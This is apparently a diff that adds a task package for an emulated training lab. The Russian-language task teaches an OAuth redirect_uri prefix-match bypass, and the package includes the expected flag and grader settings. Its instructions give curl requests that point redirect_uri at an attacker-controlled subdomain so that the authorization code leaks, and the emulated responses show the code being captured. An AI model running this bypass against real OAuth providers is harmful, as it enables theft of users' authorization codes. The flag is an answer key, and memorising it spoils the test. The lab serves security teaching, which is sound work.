@@ -1,0 +1,42 @@
+{
+  "id": "web-oauth-oidc-saml",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{r3d1r3ct_ur1_pr3f1x_byp4ss}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: redirect_uri prefix bypass\n\nПровайдер `acmeid.example` проверяет `redirect_uri` как «начинается с\nhttps://shop.local». Наивная проверка пропускает поддомен\n`shop.local.evil.com`, которым управляет атакующий — туда утечёт код.\n\n1. Легитимный запрос:\n   curl -s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local/oauth/callback&state=xyz123'\n2. Чужой домен — отказ:\n   curl -s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://our-server.evil/callback&state=xyz123'\n3. Prefix bypass:\n   curl -s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local.evil.com/callback&state=xyz123'\n4. Код утёк на наш домен — в выводе флаг. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция acmeid.example/authorize)",
+      "cases": [
+        {
+          "match": "shop\\.local\\.evil\\.com",
+          "example": "-s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local.evil.com/callback&state=xyz123'",
+          "output": "HTTP/1.1 302 Found\nLocation: https://shop.local.evil.com/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz123\nX-Debug: prefix-match bypassed allowlist nto{r3d1r3ct_ur1_pr3f1x_byp4ss}\n"
+        },
+        {
+          "match": "our-server\\.evil",
+          "example": "-s -i 'https://acmeid.example/authorize?...&redirect_uri=https://our-server.evil/callback'",
+          "output": "HTTP/1.1 400 Bad Request\n\n{\"error\":\"invalid_request\",\"error_description\":\"redirect_uri not allowed\"}\n"
+        },
+        {
+          "match": "authorize",
+          "example": "-s -i 'https://acmeid.example/authorize?...&redirect_uri=https://shop.local/oauth/callback'",
+          "output": "HTTP/1.1 302 Found\nLocation: https://shop.local/oauth/callback?code=LEGIT123&state=xyz123\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://acmeid.example/authorize.\n"
+    }
+  }
+}
